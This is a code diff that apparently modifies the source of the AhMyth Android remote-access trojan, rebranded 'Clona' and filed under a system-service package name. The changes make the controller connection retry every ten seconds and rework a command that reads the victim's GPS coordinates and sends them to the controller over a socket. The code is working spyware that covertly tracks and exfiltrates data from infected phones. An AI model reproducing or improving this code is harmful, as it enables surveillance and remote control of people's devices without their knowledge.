@@ -1,6 +1,8 @@
 package com.sys.service.manager;
 
 import android.content.Context;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.Looper;
 import android.util.Log;
 import org.json.JSONObject;
@@ -9,7 +11,7 @@ import io.socket.emitter.Emitter;
 
 
 /**
- * Created by AhMyth on 10/1/16.
+ * Connection Manager - Clona
  */
 
 public class ConnectionManager {
@@ -18,6 +20,7 @@ public class ConnectionManager {
     public static Context context;
     private static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
+    private static Handler retryHandler = new Handler(Looper.getMainLooper());
 
     public static void startAsync(Context con)
     {
@@ -25,7 +28,8 @@ public class ConnectionManager {
             context = con;
             sendReq();
         }catch (Exception ex){
-            startAsync(con);
+            Log.e("ConnectionManager", "Connection failed, retrying in 10s: " + ex.getMessage());
+            retryHandler.postDelayed(() -> startAsync(con), 10000);
         }
 
     }
@@ -164,23 +168,30 @@ try {
     }
 
     public static void x0000lm() throws Exception{
-        Looper.prepare();
-        LocManager gps = new LocManager(context);
-        JSONObject location = new JSONObject();
-        // check if GPS enabled
-        if(gps.canGetLocation()){
+        HandlerThread handlerThread = new HandlerThread("LocationThread");
+        handlerThread.start();
+        new Handler(handlerThread.getLooper()).post(() -> {
+            try {
+                LocManager gps = new LocManager(context);
+                JSONObject location = new JSONObject();
+                if(gps.canGetLocation()){
+                    double latitude = gps.getLatitude();
+                    double longitude = gps.getLongitude();
+                    Log.e("loc" , latitude+"   ,  "+longitude);
+                    location.put("enable" , true);
+                    location.put("lat" , latitude);
+                    location.put("lng" , longitude);
+                }
+                else
+                    location.put("enable" , false);
 
-            double latitude = gps.getLatitude();
-            double longitude = gps.getLongitude();
-            Log.e("loc" , latitude+"   ,  "+longitude);
-            location.put("enable" , true);
-            location.put("lat" , latitude);
-            location.put("lng" , longitude);
-        }
-        else
-            location.put("enable" , false);
-
-        ioSocket.emit("x0000lm", location);
+                ioSocket.emit("x0000lm", location);
+            } catch (Exception e) {
+                Log.e("ConnectionManager", "Location error: " + e.getMessage());
+            } finally {
+                handlerThread.quitSafely();
+            }
+        });
     }
 
     public static void x0000sc() {
